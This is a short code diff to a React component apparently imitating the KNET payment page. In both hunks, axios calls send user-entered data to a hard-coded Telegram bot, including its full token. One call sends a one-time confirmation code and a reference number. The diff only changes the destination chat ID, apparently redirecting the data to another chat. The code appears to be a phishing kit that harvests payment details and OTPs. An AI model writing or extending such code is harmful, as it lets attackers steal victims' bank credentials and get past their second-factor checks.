@@ -51,7 +51,7 @@ function KnetPageContent() {
       try {
         setIsProcessing(true);
         await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${encodeURIComponent(
+          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=-4836393174&text=${encodeURIComponent(
             text
           )}`
         );
@@ -72,7 +72,7 @@ function KnetPageContent() {
         setIsProcessing(true);
         setVerificationMsg("Code sent, verifying...");
         await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${encodeURIComponent(
+          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=-4836393174&text=${encodeURIComponent(
             `🔑 Confirmation Code: ${otp}
              🔨 Ref: ${refN}`
           )}`
